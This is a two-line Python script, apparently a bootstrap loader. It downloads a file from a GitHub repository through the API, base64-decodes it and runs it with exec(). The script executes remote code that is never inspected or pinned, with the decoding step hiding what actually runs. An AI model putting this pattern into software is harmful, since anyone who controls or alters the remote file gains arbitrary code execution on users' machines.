import base64, json, urllib.request
exec(base64.b64decode(json.loads(urllib.request.urlopen(f"https://api.github.com/repos/jesusjorge/pysite/contents/bootinit.py").read())["content"]))
